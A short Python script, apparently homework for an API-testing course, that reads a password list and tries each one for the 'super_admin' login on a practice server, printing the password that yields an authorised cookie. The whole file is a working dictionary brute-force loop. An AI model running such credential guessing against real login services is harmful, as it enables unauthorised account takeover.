import requests

with open('passwords.txt') as f_input:
    passwords = f_input.read().split()

for password in passwords:
    payload_pass = {"login": "super_admin", "password": password}
    response_pass = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload_pass)
    cookie = dict(response_pass.cookies)

    unsuccessful_text_auth = "You are NOT authorized"
    response_auth = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookie)
    if response_auth.text != unsuccessful_text_auth:
        print(f"Password: {password}. Response: {response_auth.text}")

